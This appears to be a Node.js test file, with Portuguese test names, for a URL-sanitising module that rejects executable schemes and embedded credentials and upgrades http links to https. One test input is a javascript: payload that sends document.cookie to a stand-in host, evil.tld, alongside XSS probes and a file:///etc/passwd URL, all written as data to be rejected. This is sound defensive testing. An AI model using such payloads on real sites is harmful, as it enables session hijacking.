const test = require('node:test');
const assert = require('node:assert/strict');

const { isSafeHttpsUrl, normalizeHttpsUrlOrNull, coerceExternalHttpsUrlOrNull } = require('./safe-url');

test('coerceExternalHttpsUrlOrNull: rejeita esquemas executáveis', () => {
  assert.equal(coerceExternalHttpsUrlOrNull("javascript:fetch('//evil.tld/x?c='+document.cookie)"), null);
  assert.equal(coerceExternalHttpsUrlOrNull('JavaScript:alert(1)'), null);
  assert.equal(coerceExternalHttpsUrlOrNull('data:text/html,<script>alert(1)</script>'), null);
  assert.equal(coerceExternalHttpsUrlOrNull('vbscript:msgbox(1)'), null);
  assert.equal(coerceExternalHttpsUrlOrNull('file:///etc/passwd'), null);
});

test('coerceExternalHttpsUrlOrNull: aceita https e promove http/host-nu para https', () => {
  assert.equal(coerceExternalHttpsUrlOrNull('https://cdn.teglion.com/a.png'), 'https://cdn.teglion.com/a.png');
  assert.equal(coerceExternalHttpsUrlOrNull('http://cdn.teglion.com/a.png'), 'https://cdn.teglion.com/a.png');
  assert.equal(coerceExternalHttpsUrlOrNull('cdn.teglion.com/a.png'), 'https://cdn.teglion.com/a.png');
});

test('coerceExternalHttpsUrlOrNull: rejeita valores vazios/inválidos', () => {
  assert.equal(coerceExternalHttpsUrlOrNull(null), null);
  assert.equal(coerceExternalHttpsUrlOrNull(''), null);
  assert.equal(coerceExternalHttpsUrlOrNull('   '), null);
  assert.equal(coerceExternalHttpsUrlOrNull('not a url'), null);
  assert.equal(coerceExternalHttpsUrlOrNull('https://user:pass@evil.tld'), null);
});

test('isSafeHttpsUrl: só aceita https com hostname e sem credenciais embutidas', () => {
  assert.equal(isSafeHttpsUrl('https://a.b'), true);
  assert.equal(isSafeHttpsUrl('http://a.b'), false);
  assert.equal(isSafeHttpsUrl('https://user@a.b'), false);
  assert.equal(isSafeHttpsUrl('not-a-url'), false);
});

test('normalizeHttpsUrlOrNull: exige prefixo https:// explícito, sem promoção automática', () => {
  assert.equal(normalizeHttpsUrlOrNull('http://a.b'), null);
  assert.equal(normalizeHttpsUrlOrNull('a.b'), null);
  assert.equal(normalizeHttpsUrlOrNull('https://a.b'), 'https://a.b');
});
